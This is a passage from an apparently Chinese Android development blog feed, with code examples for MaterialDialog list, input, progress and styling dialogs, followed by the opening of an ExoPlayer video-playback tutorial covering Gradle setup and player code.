.checkBoxPromptRes(R.string.dont_ask_again, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">null</span>)<br>        .onAny(<span class="hljs-keyword">new</span> MaterialDialog.SingleButtonCallback() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(MaterialDialog dialog, DialogAction which)</span> </span>&#123;<br>                Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>, dialog.isPromptCheckBoxChecked()+<span class="hljs-string">&quot;&quot;</span>, Toast.LENGTH_SHORT).show();<br>            &#125;<br>        &#125;)<br>        .show();<br><br><br></code></pre></div></td></tr></table></figure><p>8、列表<br>普通列表</p><p><img src="https://img-blog.csdn.net/20180727104018379?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .negativeText(<span class="hljs-string">&quot;取消&quot;</span>)<br>        .items(R.array.items)<br>        .itemsCallback(<span class="hljs-keyword">new</span> MaterialDialog.ListCallback() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onSelection</span><span class="hljs-params">(MaterialDialog dialog, View view, <span class="hljs-keyword">int</span> which, CharSequence text)</span> </span>&#123;<br>                Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>, which+<span class="hljs-string">&quot;&quot;</span>, Toast.LENGTH_SHORT).show();<br>            &#125;<br>        &#125;)<br>        .show();<br><br><br></code></pre></div></td></tr></table></figure><p>单选列表</p><p><img src="https://img-blog.csdn.net/20180728133237671?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .items(R.array.items)<br>        .itemsCallbackSingleChoice(-<span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> MaterialDialog.ListCallbackSingleChoice() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onSelection</span><span class="hljs-params">(MaterialDialog dialog, View view, <span class="hljs-keyword">int</span> which, CharSequence text)</span> </span>&#123;<br>                ...<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>多选列表</p><p><img src="https://img-blog.csdn.net/20180728134546513?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .items(R.array.items)<br>        .itemsCallbackMultiChoice(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> MaterialDialog.ListCallbackMultiChoice() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onSelection</span><span class="hljs-params">(MaterialDialog dialog, Integer[] which, CharSequence[] text)</span> </span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>指定id的列表</p><p><img src="https://img-blog.csdn.net/20180728135139821?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;resources&gt;<br>    &lt;string-array name=<span class="hljs-string">&quot;items&quot;</span>&gt;<br>        &lt;item&gt;aa&lt;/item&gt;<br>        &lt;item&gt;bb&lt;/item&gt;<br>        &lt;item&gt;cc&lt;/item&gt;<br>    &lt;/string-array&gt;<br>    &lt;integer-array name=<span class="hljs-string">&quot;itemIds&quot;</span>&gt;<br>        &lt;item&gt;<span class="hljs-number">1</span>&lt;/item&gt;<br>        &lt;item&gt;<span class="hljs-number">2</span>&lt;/item&gt;<br>        &lt;item&gt;<span class="hljs-number">3</span>&lt;/item&gt;<br>    &lt;/integer-array&gt;<br>&lt;/resources&gt;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><br><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;标题&quot;</span>)<br>        .positiveText(<span class="hljs-string">&quot;确认&quot;</span>)<br>        .items(R.array.items)<br>        .itemsIds(R.array.itemIds)<br>        .itemsCallback(<span class="hljs-keyword">new</span> MaterialDialog.ListCallback() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onSelection</span><span class="hljs-params">(MaterialDialog dialog, View view, <span class="hljs-keyword">int</span> which, CharSequence text)</span> </span>&#123;<br>                Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>, which + <span class="hljs-string">&quot;: &quot;</span> + text + <span class="hljs-string">&quot;, ID = &quot;</span> + view.getId(), Toast.LENGTH_SHORT).show();<br>            &#125;<br>        &#125;)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>9、自定义View</p><p><img src="https://img-blog.csdn.net/20180728141632672?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;Title&quot;</span>)<br>        .customView(R.layout.item_cart, <span class="hljs-keyword">true</span>)<br>        .positiveText(<span class="hljs-string">&quot;CHOOSE&quot;</span>)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>10、输入框</p><p><img src="https://img-blog.csdn.net/20180728151029571?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;Title&quot;</span>)<br>        .content(<span class="hljs-string">&quot;内容&quot;</span>)<br>        .inputType(InputType.TYPE_CLASS_TEXT)<br>        .input(<span class="hljs-string">&quot;说点什么&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> MaterialDialog.InputCallback() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onInput</span><span class="hljs-params">(MaterialDialog dialog, CharSequence input)</span> </span>&#123;<br>        ToastUtils.showToast(MainActivity.<span class="hljs-keyword">this</span>, input);<br>    &#125;<br>&#125;)<br>        .positiveText(<span class="hljs-string">&quot;确定&quot;</span>)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>11、限制有效字数</p><p><img src="https://img-blog.csdn.net/2018072815165148?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;Title&quot;</span>)<br>        .inputRangeRes(<span class="hljs-number">2</span>, <span class="hljs-number">20</span>, R.color.warning)<br>        .inputType(InputType.TYPE_CLASS_TEXT)<br>        .input(<span class="hljs-string">&quot;说点什么&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> MaterialDialog.InputCallback() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onInput</span><span class="hljs-params">(MaterialDialog dialog, CharSequence input)</span> </span>&#123;<br>        ToastUtils.showToast(MainActivity.<span class="hljs-keyword">this</span>, input);<br>    &#125;<br>&#125;)<br>        .positiveText(<span class="hljs-string">&quot;确定&quot;</span>)<br>        .show();<br><br><br></code></pre></div></td></tr></table></figure><p>12、加载框</p><p><img src="https://img-blog.csdn.net/20180728152147102?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;Progress&quot;</span>)<br>        .content(<span class="hljs-string">&quot;Please Wait...&quot;</span>)<br>        .progress(<span class="hljs-keyword">true</span>, <span class="hljs-number">0</span>)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>水平<br><img src="https://img-blog.csdn.net/20180728152345357?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;Progress&quot;</span>)<br>        .content(<span class="hljs-string">&quot;Please Wait...&quot;</span>)<br>        .progress(<span class="hljs-keyword">true</span>, <span class="hljs-number">0</span>)<br>        .progressIndeterminateStyle(<span class="hljs-keyword">true</span>)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>13、进度条</p><p><img src="https://img-blog.csdn.net/20180728154739120?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>public class MainActivity extends AppCompatActivity {<br>    private Thread thread;</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">startThread</span><span class="hljs-params">(Runnable run)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (thread != <span class="hljs-keyword">null</span>) &#123;<br>        thread.interrupt();<br>    &#125;<br>    thread = <span class="hljs-keyword">new</span> Thread(run);<br>    thread.start();<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>    <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>    setContentView(R.layout.activity_main);<br><br>&#125;<br><br><span class="hljs-meta">@TargetApi(Build.VERSION_CODES.JELLY_BEAN)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">click</span><span class="hljs-params">(View view)</span> </span>&#123;<br>    <span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>).title(<span class="hljs-string">&quot;Progress&quot;</span>).content(<span class="hljs-string">&quot;please wait...&quot;</span>).contentGravity(GravityEnum.CENTER).progress(<span class="hljs-keyword">false</span>, <span class="hljs-number">150</span>, <span class="hljs-keyword">true</span>).cancelListener(dialog -&gt; &#123;<br>        <span class="hljs-keyword">if</span> (thread != <span class="hljs-keyword">null</span>) &#123;<br>            thread.interrupt();<br>        &#125;<br>    &#125;).showListener(dialogInterface -&gt; &#123;<br>        <span class="hljs-keyword">final</span> MaterialDialog dialog = (MaterialDialog) dialogInterface;<br>        startThread(() -&gt; &#123;<br>            <span class="hljs-keyword">while</span> (dialog.getCurrentProgress() != dialog.getMaxProgress() &amp;&amp; !Thread.currentThread().isInterrupted()) &#123;<br>                <span class="hljs-keyword">if</span> (dialog.isCancelled()) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Thread.sleep(<span class="hljs-number">50</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                dialog.incrementProgress(<span class="hljs-number">1</span>);<br>            &#125;<br>            runOnUiThread(() -&gt; &#123;<br>                thread = <span class="hljs-keyword">null</span>;<br>                dialog.setContent(getString(R.string.md_done_label));<br>            &#125;);<br>        &#125;);<br>    &#125;).show();<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>14、样式<br>主题</p><p><img src="https://img-blog.csdn.net/20180728155258605?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;Progress&quot;</span>)<br>        .content(<span class="hljs-string">&quot;Please Wait...&quot;</span>)<br>        .theme(Theme.DARK)<br>        .progress(<span class="hljs-keyword">true</span>, <span class="hljs-number">0</span>)<br>        .progressIndeterminateStyle(<span class="hljs-keyword">true</span>)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>颜色</p><p>可以设置颜色的有以下这些</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">.titleColorRes(R.color.material_red_500)<br>.contentColor(Color.WHITE) <span class="hljs-comment">// notice no &#x27;res&#x27; postfix for literal color</span><br>.linkColorAttr(R.attr.my_link_color_attr)  <span class="hljs-comment">// notice attr is used instead of none or res for attribute resolving</span><br>.dividerColorRes(R.color.material_pink_500)<br>.backgroundColorRes(R.color.material_blue_grey_800)<br>.positiveColorRes(R.color.material_red_500)<br>.neutralColorRes(R.color.material_red_500)<br>.negativeColorRes(R.color.material_red_500)<br>.widgetColorRes(R.color.material_red_500)<br>.buttonRippleColorRes(R.color.material_red_500)<br></code></pre></div></td></tr></table></figure><p>透明背景<br><img src="https://img-blog.csdn.net/20180728160010602?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjUyNzI2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> MaterialDialog.Builder(<span class="hljs-keyword">this</span>)<br>        .title(<span class="hljs-string">&quot;Progress&quot;</span>)<br>        .content(<span class="hljs-string">&quot;Please Wait...&quot;</span>)<br>        .titleColorRes(R.color.white)<br>        .contentColor(Color.WHITE)<br>        .backgroundColorRes(R.color.alpha_black_80)<span class="hljs-comment">//#80000000</span><br>        .progress(<span class="hljs-keyword">true</span>, <span class="hljs-number">0</span>)<br>        .show();<br><br></code></pre></div></td></tr></table></figure><p>Selectors</p><p>用来改变drawable被点击或聚焦时的状态</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">.btnSelector(R.drawable.custom_btn_selector)<br>.btnSelector(R.drawable.custom_btn_selector_primary, DialogAction.POSITIVE)<br>.btnSelectorStacked(R.drawable.custom_btn_selector_stacked)<br>.listSelector(R.drawable.custom_list_and_stackedbtn_selector)<br><br></code></pre></div></td></tr></table></figure><p>Gravity</p><p>改变位置</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">.titleGravity(GravityEnum.CENTER)<br>.contentGravity(GravityEnum.CENTER)<br>.btnStackedGravity(GravityEnum.START)<br>.itemsGravity(GravityEnum.END)<br>.buttonsGravity(GravityEnum.END)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio 交互弹窗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>弹窗</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础</title>
    <link href="/2021/05/28/AndroidStudio/%E8%A7%86%E9%A2%91/ExoPlayer/ExoPlayer%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/05/28/AndroidStudio/%E8%A7%86%E9%A2%91/ExoPlayer/ExoPlayer%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="ExoPlayer-基础"><a href="#ExoPlayer-基础" class="headerlink" title="ExoPlayer 基础"></a>ExoPlayer 基础</h1><p><a href="https://exoplayer.dev/hello-world.html">官方参考文档</a></p><p><a href="https://developer.android.com/codelabs/exoplayer-intro">实例参考</a></p><h1 id="准备的内容"><a href="#准备的内容" class="headerlink" title="准备的内容"></a>准备的内容</h1><p>build.gradle 中添加</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">implementation <span class="hljs-string">&#x27;com.google.android.exoplayer:exoplayer:2.14.0&#x27;</span><br>implementation <span class="hljs-string">&#x27;com.google.android.exoplayer:exoplayer-core:2.14.0&#x27;</span><br>implementation <span class="hljs-string">&#x27;com.google.android.exoplayer:exoplayer-dash:2.14.0&#x27;</span><br>implementation <span class="hljs-string">&#x27;com.google.android.exoplayer:exoplayer-ui:2.14.0&#x27;</span><br><span class="hljs-comment">//以及防止报错的</span><br>implementation <span class="hljs-string">&#x27;com.android.support:multidex:1.0.3&#x27;</span><br><span class="hljs-comment">//还有在上面部分增加</span><br>    defaultConfig &#123;<br>        multiDexEnabled <span class="hljs-keyword">true</span><br>        applicationId <span class="hljs-string">&quot;com.lwx.videoapplication&quot;</span><br>        minSdkVersion <span class="hljs-number">16</span><br>        targetSdkVersion <span class="hljs-number">30</span><br>        versionCode <span class="hljs-number">1</span><br>        versionName <span class="hljs-string">&quot;1.0&quot;</span><br><br>        testInstrumentationRunner <span class="hljs-string">&quot;androidx.test.runner.AndroidJUnitRunner&quot;</span><br>    &#125;<br></code></pre></div></td></tr></table></figure><h1 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h1><p>视图</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">com.google.android.exoplayer2.ui.PlayerView</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/video_view&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span>/&gt;</span><br></code></pre></div></td></tr></table></figure><p>主界面</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//获取布局</span><br>        PlayerView playerView=findViewById(R.id.video_view);<br>        <span class="hljs-comment">//创建播放器</span><br>        SimpleExoPlayer player=<span class="hljs-keyword">new</span> SimpleExoPlayer.Builder(<span class="hljs-keyword">this</span>).build();<br>        <span class="hljs-comment">//将播放器附加到视图</span><br>        playerView.setPlayer(player);<br>        <span class="hljs-comment">//填充播放列表并准备播放器</span><br>        <span class="hljs-comment">// Build the media item.</span><br>        String video2url=<span class="hljs-string">&quot;android.resource://com.lwx.videoapplication/&quot;</span>+R.raw.video2;<br>        String videonet=<span class="hljs-string">&quot;http://121.196.162.32/video/2.mkv&quot;</span>;<br>        MediaItem mediaItem= MediaItem.fromUri(Uri.parse(video2url));<br>        MediaItem two=MediaItem.fromUri(videonet);<br>        <span class="hljs-comment">// Set the media item to be played.</span><br><span class="hljs-comment">//        player.setMediaItem(mediaItem);</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 依次播放设置</span><br><span class="hljs-comment">         */</span><br>        player.addMediaItem(mediaItem);<br>        player.addMediaItem(two);<br>        <span class="hljs-comment">// Prepare the player.</span><br>        player.prepare();<br>        <span class="hljs-comment">// Start the playback.</span><br>        player.play();<br></code></pre></div></td></tr></table></figure><p>暂时推出后继续播放</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 